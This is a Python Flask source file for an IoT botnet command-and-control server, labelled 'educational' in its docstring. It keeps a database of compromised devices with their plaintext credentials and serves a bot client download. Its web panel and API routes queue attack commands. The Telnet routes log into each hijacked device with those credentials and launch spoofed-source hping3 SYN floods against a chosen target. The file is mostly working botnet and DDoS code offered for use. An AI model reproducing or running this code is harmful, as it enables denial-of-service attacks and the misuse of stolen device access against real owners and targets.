#!/usr/bin/env python3
"""
IoT Security Research - Command & Control Server
Educational Purpose Only - For Controlled Lab Environment
"""

from flask import Flask, request, jsonify, send_file, render_template_string
import sqlite3
import threading
import time
from datetime import datetime
import logging
from werkzeug.serving import make_server
import json
import telnetlib
import subprocess
import requests
import os
import argparse
import platform

app = Flask(__name__)

# Configure logging for research purposes
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cnc_research.log'),
        logging.StreamHandler()
    ]
)

# Database initialization
def init_database():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Table for compromised devices
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            username TEXT,
            password TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TIMESTAMP,
            infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Table for commands
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            target_ip TEXT,
            attack_type TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'pending',
            bot_ip TEXT
        )
    ''')
    
    # Table for attack logs (scan results)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            port INTEGER,
            service TEXT,
            credentials TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            attack_type TEXT,
            target TEXT,
            start_time TIMESTAMP,
            participating_bots INTEGER,
            status TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    logging.info("Database initialized successfully")

class DatabaseManager:
    def __init__(self):
        self.db_lock = threading.Lock()
    
    def get_connection(self):
        return sqlite3.connect('research_db.sqlite')
    
    def register_device(self, ip, username, password):
        """Register a compromised device"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ''', (ip, username, password))
                conn.commit()
                logging.info(f"Device registered: {ip} ({username})")
                return True
            except Exception as e:
                logging.error(f"Failed to register device {ip}: {e}")
                return False
            finally:
                conn.close()
    
    def update_device_status(self, ip, status):
        """Update device status"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip = ?
            ''', (status, ip))
            conn.commit()
            conn.close()
    
    def get_all_devices(self):
        """Get all devices from database"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def get_online_devices(self):
        """Get only online devices"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def log_attack(self, attack_type, target, participating_bots):
        """Log attack information"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (attack_type, target, start_time, participating_bots, status)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, 'active')
            ''', (attack_type, target, participating_bots))
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return attack_id

    def execute_telnet_login_and_send(self, ip, username, password, command):
        """Establish Telnet connection, login, and send command"""
        tn = None
        try:
            logging.info(f"Attempting Telnet connection to {ip}:23")
            tn = telnetlib.Telnet(ip, 23, timeout=25)
            logging.info(f"Telnet connection to {ip} established")

            # Handle login prompt
            login_patterns = [b"login: ", b"Username: "]
            index, match, response = tn.expect(login_patterns, timeout=15)
            
            if not match:
                logging.error(f"No login prompt detected on {ip}")
                tn.close()
                return None

            # Send username
            tn.write(username.encode() + b"\n")
            logging.info(f"Sent username to {ip}")

            # Handle password prompt
            password_patterns = [b"Password: ", b"password: "]
            index, match, response = tn.expect(password_patterns, timeout=10)
            
            if not match:
                logging.error(f"No password prompt detected on {ip}")
                tn.close()
                return None

            # Send password
            tn.write((password or "").encode() + b"\n")
            logging.info(f"Sent password to {ip}")

            # Wait for shell prompt
            shell_patterns = [b"$", b"#", b">"]
            index, match, response = tn.expect(shell_patterns, timeout=15)
            
            if not match:
                logging.error(f"No shell prompt detected on {ip}")
                tn.close()
                return None

            # Send command
            logging.info(f"Sending command to {ip}: {command}")
            tn.write(command.encode() + b"\n")
            time.sleep(2)

            # Handle sudo prompt if needed
            sudo_pattern = b"[sudo] password for"
            hping_patterns = [b"HPING", b"hping in flood mode"]
            
            patterns = [sudo_pattern] + hping_patterns + shell_patterns
            index, match, response = tn.expect(patterns, timeout=20)
            
            if match and sudo_pattern in match.group(0):
                logging.info(f"Sudo prompt detected on {ip}, sending password")
                tn.write(password.encode() + b"\n")
                time.sleep(2)

            logging.info(f"Command executed successfully on {ip}")
            return tn

        except Exception as e:
            logging.error(f"Telnet execution failed for {ip}: {e}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None

    def stop_telnet_session(self, ip, tn):
        """Stop telnet session gracefully"""
        try:
            logging.info(f"Stopping Telnet session for {ip}")
            # Send interrupt signals
            tn.write(b"\x03")  # Ctrl+C
            time.sleep(1)
            tn.write(b"\x1a")  # Ctrl+Z
            time.sleep(1)
            tn.close()
            logging.info(f"Telnet session closed for {ip}")
            return True
        except Exception as e:
            logging.error(f"Error stopping Telnet session for {ip}: {e}")
            try:
                tn.close()
            except:
                pass
            return False

# Global variables
db_manager = DatabaseManager()
active_telnet_sessions = {} # Dictionary to hold active Telnet session objects {ip: tn_object}
current_attack = None
attack_status = {
    'active': False,
    'type': None,
    'target': None,
    'start_time': None,
    'participating_bots': 0
}

# Initialize database on startup
init_database()

# HTML template for web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>IoT C2 Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .section { margin-bottom: 20px; padding: 20px; border: 1px solid #ddd; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f5f5f5; }
        .button { padding: 5px 10px; margin: 2px; cursor: pointer; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h1>IoT C2 Server Control Panel</h1>
        
        <div class="section">
            <h2>Active Bots</h2>
            <table>
                <tr>
                    <th>IP Address</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Status</th>
                    <th>Last Seen</th>
                    <th>Actions</th>
                </tr>
                {% for bot in bots %}
                <tr>
                    <td>{{ bot.ip }}</td>
                    <td>{{ bot.username }}</td>
                    <td>{{ bot.password }}</td>
                    <td>{{ bot.status }}</td>
                    <td>{{ bot.last_seen }}</td>
                    <td>
                        <button onclick="startAttack('{{ bot.ip }}')">Start Attack</button>
                        <button onclick="stopAttack('{{ bot.ip }}')">Stop Attack</button>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Scan Results</h2>
            <table>
                <tr>
                    <th>IP Address</th>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Credentials</th>
                    <th>Timestamp</th>
                </tr>
                {% for result in scan_results %}
                <tr>
                    <td>{{ result.ip }}</td>
                    <td>{{ result.port }}</td>
                    <td>{{ result.service }}</td>
                    <td>{{ result.credentials }}</td>
                    <td>{{ result.timestamp }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Command History</h2>
            <table>
                <tr>
                    <th>Bot IP</th>
                    <th>Command</th>
                    <th>Target</th>
                    <th>Status</th>
                    <th>Timestamp</th>
                </tr>
                {% for cmd in commands %}
                <tr>
                    <td>{{ cmd.bot_ip }}</td>
                    <td>{{ cmd.command }}</td>
                    <td>{{ cmd.target }}</td>
                    <td>{{ cmd.status }}</td>
                    <td>{{ cmd.timestamp }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>

    <script>
        function startAttack(botIp) {
            const target = prompt('Enter target IP:');
            const attackType = prompt('Enter attack type (syn/rtsp/mqtt):');
            if (target && attackType) {
                fetch('/start-attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        bot_ip: botIp,
                        target: target,
                        attack_type: attackType
                    })
                }).then(response => response.json())
                  .then(data => alert(data.message));
            }
        }

        function stopAttack(botIp) {
            fetch('/stop-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bot_ip: botIp})
            }).then(response => response.json())
              .then(data => alert(data.message));
        }

        // Auto-refresh every 30 seconds
        setInterval(() => location.reload(), 30000);
    </script>
</body>
</html>
'''

class C2Server:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.bots = {}
        self.commands = {}
        self.scan_results = []
        self.server = None
        init_database()
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[C2 Server] {message}")
    
    def start(self):
        """Start the C2 server"""
        self.log(f"Starting C2 server on {self.host}:{self.port}")
        self.server = make_server(self.host, self.port, app)
        self.server.serve_forever()
    
    def stop(self):
        """Stop the C2 server"""
        if self.server:
            self.server.shutdown()
            self.log("C2 server stopped")

# Flask routes
@app.route('/')
def index():
    """Web interface for C2 server"""
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Get active bots - Include username and password
    cursor.execute('SELECT ip, username, password, status, last_seen FROM devices WHERE status = "online" ORDER BY last_seen DESC')
    bots = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'last_seen': row[4]} for row in cursor.fetchall()]
    
    # Get only the latest scan result for each unique IP
    cursor.execute('''
        SELECT ip, port, service, credentials, MAX(timestamp) as timestamp
        FROM attack_logs
        GROUP BY ip
        ORDER BY timestamp DESC
    ''')
    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 
                    'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
    
    # Get command history
    cursor.execute('SELECT id, command, target_ip, attack_type, status, timestamp FROM commands ORDER BY timestamp DESC')
    commands = [{'id': row[0], 'command': row[1], 'target': row[2], 
                'attack_type': row[3], 'status': row[4], 'timestamp': row[5]} for row in cursor.fetchall()]
    
    conn.close()
    
    return render_template_string(HTML_TEMPLATE, 
                                bots=bots, 
                                scan_results=scan_results, 
                                commands=commands)

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Handle bot check-in and device registration"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
            
        bot_ip = data.get('ip')
        username = data.get('username')
        password = data.get('password')
        status = data.get('status', 'online')

        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400

        # Register device with credentials
        success = db_manager.register_device(bot_ip, username, password)
        
        if success:
            return jsonify({'status': 'success', 'message': 'Device registered successfully'})
        else:
            return jsonify({'error': 'Failed to register device'}), 500

    except Exception as e:
        logging.error(f"Error in bot check-in: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-command/<bot_ip>', methods=['GET'])
def get_command(bot_ip):
    """Get the latest command for a bot"""
    try:
        with db_manager.db_lock:
            conn = db_manager.get_connection()
            cursor = conn.cursor()
            
            # Get the latest pending command for this specific bot
            cursor.execute('''
                SELECT id, command, target_ip, attack_type
                FROM commands
                WHERE (bot_ip = ? OR bot_ip IS NULL)
                AND status = 'pending'
                ORDER BY id DESC
                LIMIT 1
            ''', (bot_ip,))
            
            command = cursor.fetchone()
            
            if command:
                command_id, command_data, target_ip, attack_type = command
                
                # Update command status to 'executing'
                cursor.execute('''
                    UPDATE commands
                    SET status = 'executing'
                    WHERE id = ?
                ''', (command_id,))
                
                conn.commit()
                conn.close()
                
                return jsonify({
                    'command_id': command_id,
                    'command': json.loads(command_data),
                    'target_ip': target_ip,
                    'attack_type': attack_type
                })
            
            conn.close()
            return jsonify({'status': 'no_command'})
            
    except Exception as e:
        logging.error(f"Failed to get command for bot {bot_ip}: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-attack', methods=['POST'])
def start_attack():
    """Start a DDoS attack by translating the request into hping3 commands"""
    try:
        data = request.get_json()
        target = data.get('target')
        attack_type = data.get('attack_type', 'syn')
        bot_ip = data.get('bot_ip')  # Get the specific bot IP
        
        if not target:
            return jsonify({'error': 'Target IP required'}), 400
            
        # Translate attack request into hping3 command
        if attack_type == 'syn':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '80',        # Target port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        elif attack_type == 'rtsp':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '554',       # RTSP port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        elif attack_type == 'mqtt':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '1883',      # MQTT port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        else:
            return jsonify({'error': 'Invalid attack type'}), 400
            
        # Store command in database
        with db_manager.db_lock:
            conn = db_manager.get_connection()
            cursor = conn.cursor()
            
            # If bot_ip is specified, create command for that specific bot
            if bot_ip:
                cursor.execute('''
                    INSERT INTO commands (command, target_ip, attack_type, status, bot_ip)
                    VALUES (?, ?, ?, 'pending', ?)
                ''', (json.dumps(command), target, attack_type, bot_ip))
            else:
                # Create command for all online bots
                cursor.execute('''
                    INSERT INTO commands (command, target_ip, attack_type, status)
                    VALUES (?, ?, ?, 'pending')
                ''', (json.dumps(command), target, attack_type))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
        logging.info(f"Attack command created: {command} against {target}")
        return jsonify({'status': 'success', 'command_id': command_id})
        
    except Exception as e:
        logging.error(f"Failed to start attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    """Stop DDoS attack"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')
        
        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400
        
        # Add stop command to database
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO commands 
                    (command, target_ip, status, timestamp)
                    VALUES (?, ?, ?, datetime('now'))''',
                 (f"stop_ddos {bot_ip}", bot_ip, 'pending'))
        conn.commit()
        conn.close()
        
        return jsonify({'message': f'Stop command sent to {bot_ip}'})
        
    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/add-scan-result', methods=['POST'])
def add_scan_result():
    """Add scan result to database"""
    try:
        data = request.json
        required_fields = ['ip', 'port', 'service']
        
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO attack_logs 
                    (ip, port, service, credentials, timestamp)
                    VALUES (?, ?, ?, ?, datetime('now'))''',
                 (data['ip'], data['port'], data['service'], 
                  data.get('credentials', '')))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error adding scan result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/download-bot', methods=['GET'])
def download_bot():
    """Serve bot client script"""
    try:
        return send_file('bot_client.py',
                        mimetype='text/plain',
                        as_attachment=True,
                        download_name='bot_client.py')
    except Exception as e:
        logging.error(f"Error serving bot client: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-scan-results', methods=['GET'])
def get_scan_results():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT ip, port, service, credentials, MAX(timestamp) as timestamp
        FROM attack_logs
        GROUP BY ip
        ORDER BY timestamp DESC
    ''')
    results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
    conn.close()
    return jsonify(results)

@app.route('/get-compromised-devices', methods=['GET'])
def get_compromised_devices():
    """Get all compromised devices from the database."""
    try:
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('SELECT ip, username, password, status, last_seen FROM devices')
        devices = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
        conn.close()
        logging.info(f"Fetched {len(devices)} compromised devices from database.")
        return jsonify(devices)
    except Exception as e:
        logging.error(f"Error fetching compromised devices: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-telnet-ddos', methods=['POST'])
def start_telnet_ddos():
    """Start DDoS attack on all compromised devices via Telnet."""
    global active_telnet_sessions
    try:
        data = request.get_json()
        logging.info(f"Received data for start-telnet-ddos: {data}")
        target_ip = data.get('target')
        logging.info(f"start-telnet-ddos: Retrieved target_ip: '{target_ip}', type: {type(target_ip)}")
        attack_type = data.get('attack_type', 'syn')

        # Check if target_ip is None or an empty string explicitly
        if target_ip is None or target_ip == '':
            logging.warning("Start-telnet-ddos: Target IP required but not received (explicit check).")
            return jsonify({'error': 'Target IP missing or empty in request'}), 400

        logging.info("start-telnet-ddos: Target IP check passed.") # Log if the check is passed

        # Get all compromised devices from the database
        conn = db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "online" OR status = "active"')
        devices = cursor.fetchall()
        conn.close()

        logging.info(f"Retrieved {len(devices)} devices from database for Telnet DDoS.") # Added logging

        successful_sessions = []

        # Translate attack type to hping3 command template
        if attack_type == 'syn':
            hping3_cmd_template = f"sudo hping3 -S -p 80 --flood --rand-source {target_ip}"
        elif attack_type == 'rtsp':
             hping3_cmd_template = f"sudo hping3 -S -p 554 --flood --rand-source {target_ip}"
        elif attack_type == 'mqtt':
             hping3_cmd_template = f"sudo hping3 -S -p 1883 --flood --rand-source {target_ip}"
        else:
            return jsonify({'error': 'Invalid attack type'}), 400

        # Clear any previous active sessions before starting new ones
        active_telnet_sessions.clear()
        logging.info("Cleared previous active Telnet sessions.")

        for device in devices:
            ip, username, password = device
            # Construct the full hping3 command for this device
            hping3_cmd = hping3_cmd_template

            # Attempt to establish session, login, and send the command
            tn = db_manager.execute_telnet_login_and_send(ip, username, password, hping3_cmd)

            if tn:
                # Store the active Telnet session if successfully established and command sent
                active_telnet_sessions[ip] = tn
                successful_sessions.append(ip)
                logging.info(f"Successfully started Telnet session for {ip} and sent command.")
            else:
                logging.error(f"Failed to establish Telnet session or send command for {ip}.")

        return jsonify({
            'status': 'success',
            'message': f'Attempted to start {attack_type.upper()} attack sessions on {len(successful_sessions)}/{len(devices)} devices against {target_ip}',
            'successful_ips': successful_sessions
        })

    except Exception as e:
        logging.error(f"Failed to initiate Telnet DDoS attack sessions: {e}")
        # Attempt to close any sessions that might have been partially opened on error
        for ip, tn in list(active_telnet_sessions.items()):
             if tn:
                  try:
                       tn.close()
                       del active_telnet_sessions[ip]
                  except:
                       pass
        return jsonify({'error': str(e)}), 500

@app.route('/stop-telnet-ddos', methods=['POST'])
def stop_telnet_ddos():
    """Stop DDoS attack on all compromised devices via active Telnet sessions."""
    global active_telnet_sessions
    stopped_count = 0
    errors = {}
    initial_session_count = len(active_telnet_sessions)

    # Iterate through active sessions and stop them
    # Create a list of keys to iterate over as the dictionary will be modified
    ips_to_stop = list(active_telnet_sessions.keys())
    logging.info(f"Attempting to stop {len(ips_to_stop)} active Telnet DDoS sessions.")

    for ip in ips_to_stop:
        tn = active_telnet_sessions.get(ip)
        if tn:
            success = db_manager.stop_telnet_session(ip, tn)
            if success:
                stopped_count += 1
            else:
                errors[ip] = f"Failed to stop session for {ip}"

            # Remove from active sessions regardless of stop success
            if ip in active_telnet_sessions:
                 del active_telnet_sessions[ip]

    response_message = f'Attempted to stop DDoS attack on {stopped_count}/{initial_session_count} devices.'
    if errors:
        response_message += f' Errors on: {list(errors.keys())}'

    return jsonify({
        'status': 'success' if not errors else 'partial_success',
        'message': response_message,
        'errors': errors
    })

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    args = parser.parse_args()
    
    server = C2Server(args.host, args.port)
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()